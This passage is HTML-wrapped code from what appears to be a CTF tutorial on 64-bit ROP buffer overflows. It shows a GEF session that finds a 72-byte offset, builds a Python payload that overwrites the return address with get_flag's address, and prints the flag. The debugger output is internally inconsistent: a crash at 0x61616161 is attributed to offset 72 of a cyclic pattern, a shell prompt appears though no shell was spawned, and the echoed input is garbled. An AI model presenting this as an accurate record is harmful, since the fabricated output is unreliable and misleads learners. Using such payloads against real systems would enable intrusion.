class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"> 0x4011a5 </span><span class="token operator">&lt;</span><span class="token plain">get_flag</span><span class="token operator">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Analyze vulnerable function</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ disassemble vulnerable_function</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Dump of assembler code </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">function</span><span class="token plain"> vulnerable_function:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x00000000004011d1 </span><span class="token operator">&lt;</span><span class="token plain">+</span><span class="token operator file-descriptor important">0</span><span class="token operator">&gt;</span><span class="token plain">:     push   rbp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x00000000004011d2 </span><span class="token operator">&lt;</span><span class="token plain">+</span><span class="token operator file-descriptor important">1</span><span class="token operator">&gt;</span><span class="token plain">:     mov    rbp,rsp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x00000000004011d5 </span><span class="token operator">&lt;</span><span class="token plain">+</span><span class="token operator file-descriptor important">4</span><span class="token operator">&gt;</span><span class="token plain">:     sub    rsp,0x50</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x00000000004011d9 </span><span class="token operator">&lt;</span><span class="token plain">+</span><span class="token operator file-descriptor important">8</span><span class="token operator">&gt;</span><span class="token plain">:     lea    rdi,</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">rip+0xe32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)"># 0x402012</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x00000000004011e0 </span><span class="token operator">&lt;</span><span class="token plain">+1</span><span class="token operator file-descriptor important">5</span><span class="token operator">&gt;</span><span class="token plain">:    call   0x401030 </span><span class="token operator">&lt;</span><span class="token plain">printf@plt</span><span class="token operator">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x00000000004011e5 </span><span class="token operator">&lt;</span><span class="token plain">+2</span><span class="token operator file-descriptor important">0</span><span class="token operator">&gt;</span><span class="token plain">:    mov    rdi,QWORD PTR </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">rip+0x2e54</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain">  </span><span class="token comment" style="color:rgb(98, 114, 164)"># 0x404040</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x00000000004011ec </span><span class="token operator">&lt;</span><span class="token plain">+2</span><span class="token operator file-descriptor important">7</span><span class="token operator">&gt;</span><span class="token plain">:    call   0x401040 </span><span class="token operator">&lt;</span><span class="token plain">fflush@plt</span><span class="token operator">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x00000000004011f1 </span><span class="token operator">&lt;</span><span class="token plain">+3</span><span class="token operator file-descriptor important">2</span><span class="token operator">&gt;</span><span class="token plain">:    lea    rax,</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">rbp-0x50</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x00000000004011f5 </span><span class="token operator">&lt;</span><span class="token plain">+3</span><span class="token operator file-descriptor important">6</span><span class="token operator">&gt;</span><span class="token plain">:    mov    edx,0xc8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x00000000004011fa </span><span class="token operator">&lt;</span><span class="token plain">+4</span><span class="token operator file-descriptor important">1</span><span class="token operator">&gt;</span><span class="token plain">:    mov    rsi,rax</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x00000000004011fd </span><span class="token operator">&lt;</span><span class="token plain">+4</span><span class="token operator file-descriptor important">4</span><span class="token operator">&gt;</span><span class="token plain">:    mov    edi,0x0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0000000000401202 </span><span class="token operator">&lt;</span><span class="token plain">+4</span><span class="token operator file-descriptor important">9</span><span class="token operator">&gt;</span><span class="token plain">:    call   0x401050 </span><span class="token operator">&lt;</span><span class="token plain">read@plt</span><span class="token operator">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0000000000401207 </span><span class="token operator">&lt;</span><span class="token plain">+5</span><span class="token operator file-descriptor important">4</span><span class="token operator">&gt;</span><span class="token plain">:    lea    rax,</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">rbp-0x50</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x000000000040120b </span><span class="token operator">&lt;</span><span class="token plain">+5</span><span class="token operator file-descriptor important">8</span><span class="token operator">&gt;</span><span class="token plain">:    mov    rsi,rax</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x000000000040120e </span><span class="token operator">&lt;</span><span class="token plain">+6</span><span class="token operator file-descriptor important">1</span><span class="token operator">&gt;</span><span class="token plain">:    lea    rdi,</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">rip+0xe10</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)"># 0x402025</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x0000000000401215 </span><span class="token operator">&lt;</span><span class="token plain">+6</span><span class="token operator file-descriptor important">8</span><span class="token operator">&gt;</span><span class="token plain">:    call   0x401030 </span><span class="token operator">&lt;</span><span class="token plain">printf@plt</span><span class="token operator">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x000000000040121a </span><span class="token operator">&lt;</span><span class="token plain">+7</span><span class="token operator file-descriptor important">3</span><span class="token operator">&gt;</span><span class="token plain">:    nop</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x000000000040121b </span><span class="token operator">&lt;</span><span class="token plain">+7</span><span class="token operator file-descriptor important">4</span><span class="token operator">&gt;</span><span class="token plain">:    leave</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0x000000000040121c </span><span class="token operator">&lt;</span><span class="token plain">+7</span><span class="token operator file-descriptor important">5</span><span class="token operator">&gt;</span><span class="token plain">:    ret</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">End of assembler dump.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Find ROP gadgets needed for exploitation</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ ropper </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--search</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;pop rdi&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">INFO</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Load gadgets from cache</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">LOAD</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> loading</span><span class="token punctuation" style="color:rgb(248, 248, 242)">..</span><span class="token plain">. </span><span class="token number">100</span><span class="token plain">%</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">LOAD</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> removing double gadgets</span><span class="token punctuation" style="color:rgb(248, 248, 242)">..</span><span class="token plain">. </span><span class="token number">100</span><span class="token plain">%</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Gadgets</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000401273: pop rdi</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> ret</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># We need this gadget to set up the argument for get_flag()</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># In 64-bit System V ABI, first argument goes in RDI</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Set breakpoint and analyze buffer layout</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">break</span><span class="token plain"> *vulnerable_function+49</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Breakpoint </span><span class="token number">1</span><span class="token plain"> at 0x401202: </span><span class="token function" style="color:rgb(80, 250, 123)">file</span><span class="token plain"> vuln64.c, line </span><span class="token number">17</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Generate pattern for offset calculation</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern create </span><span class="token number">200</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">+</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Generating a pattern of </span><span class="token number">200</span><span class="token plain"> bytes </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">n</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaav</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Run with pattern</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ run</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting program: /home/user/vuln64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üéØ </span><span class="token number">64</span><span class="token plain">-bit ROP Chain Challenge</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üìç Win function: 0x401179</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üìç Flag function: 0x4011a5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Breakpoint </span><span class="token number">1</span><span class="token plain">, 0x0000000000401202 </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> vulnerable_function </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> at vuln64.c:17.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Examine stack layout</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ telescope </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rsp</span><span class="token plain"> </span><span class="token number">20</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00007fffffffddb0‚îÇ+0x0000: 0x0000000000000000     ‚Üê </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rsp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00007fffffffddb8‚îÇ+0x0008: 0x0000000000000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00007fffffffddc0‚îÇ+0x0010: 0x0000000000000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00007fffffffddc8‚îÇ+0x0018: 0x0000000000000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00007fffffffddd0‚îÇ+0x0020: 0x0000000000000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00007fffffffddd8‚îÇ+0x0028: 0x0000000000000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00007fffffffdde0‚îÇ+0x0030: 0x0000000000000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00007fffffffdde8‚îÇ+0x0038: 0x0000000000000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00007fffffffddf0‚îÇ+0x0040: 0x0000000000000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00007fffffffddf8‚îÇ+0x0048: 0x0000000000000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00007fffffffde00‚îÇ+0x0050: 0x00007fffffffde20     ‚Üê </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rbp</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">saved frame pointer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x00007fffffffde08‚îÇ+0x0058: 0x000000000040125c  ‚Üí  </span><span class="token operator">&lt;</span><span class="token plain">main+7</span><span class="token operator file-descriptor important">5</span><span class="token operator">&gt;</span><span class="token plain"> mov eax, 0x0  ‚Üê </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">return</span><span class="token plain"> address</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Input the pattern when prompted</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaav</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Continue execution</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Continuing.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üìù Enter your input: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaav</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üìã You entered: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaav</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000061616161 </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> ?? </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Find offset to control RIP</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern search </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rip</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">+</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Searching </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;0x61616161&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">+</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Found at offset </span><span class="token number">72</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">little-endian search</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> likely</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Verify offset</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern offset 0x6161616161616161</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">+</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Searching </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;0x6161616161616161&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">+</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Found at offset </span><span class="token number">72</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">little-endian search</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> likely</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Perfect! We need 72 bytes to reach the return address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Now create ROP chain to call get_flag()</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># We need: pop rdi; ret; followed by get_flag address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># But get_flag() doesn&#x27;t take arguments, so we can call it directly</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Create exploit with ROP chain</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ run</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting program: /home/user/vuln64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üéØ </span><span class="token number">64</span><span class="token plain">-bit ROP Chain Challenge</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üìç Win function: 0x401179</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üìç Flag function: 0x4011a5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üìù Enter your input: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Input: 72 bytes padding + get_flag address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA√Ñ‚ë•</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Create the payload</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># 72 &#x27;A&#x27;s + address of get_flag (0x4011a5)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python3 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-c</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;import sys; sys.stdout.buffer.write(b&#x27;A&#x27;*72 + b&#x27;</span><span class="token string entity" style="color:rgb(255, 121, 198)">\xa5</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x11</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x40</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x00</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x00</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x00</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x00</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x00</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Run with exploit payload</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ run </span><span class="token operator">&lt;</span><span class="token plain"> </span><span class="token operator">&lt;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">python3 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-c</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;import sys; sys.stdout.buffer.write(b&#x27;A&#x27;*72 + b&#x27;</span><span class="token string entity" style="color:rgb(255, 121, 198)">\xa5</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x11</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x40</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x00</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x00</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x00</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x00</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x00</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;)&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting program: /home/user/vuln64 </span><span class="token operator">&lt;</span><span class="token plain"> </span><span class="token operator">&lt;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">python3 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-c</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;import sys; sys.stdout.buffer.write(b&#x27;A&#x27;*72 + b&#x27;</span><span class="token string entity" style="color:rgb(255, 121, 198)">\xa5</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x11</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x40</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x00</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x00</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x00</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x00</span><span class="token string entity" style="color:rgb(255, 121, 198)">\x00</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;)&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üéØ </span><span class="token number">64</span><span class="token plain">-bit ROP Chain Challenge</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üìç Win function: 0x401179</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üìç Flag function: 0x4011a5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üìù Enter your input: üìã You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA√Ñ‚ë•</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üéØ Flag </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">function</span><span class="token plain"> reached</span><span class="token operator">!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">üö© Flag: CTF</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain">64bit_rop_chain_mastered</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ </span><span class="token function" style="color:rgb(80, 250, 123)">whoami</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">exit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">Inferior </span><span class="token number">1</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">process </span><span class="token number">23456</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> exited normally</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="advanced-64-bit-rop-chain-analysis">Advanced 64-bit ROP Chain Analysis<a href="#advanced-64-bit-rop-chain-analysis" class="hash-link" aria-label="Direct link to Advanced 64-bit ROP Chain Analysis" title="Direct link to Advanced 64-bit ROP Chain Analysis" translate="no">‚Äã</a></h3>
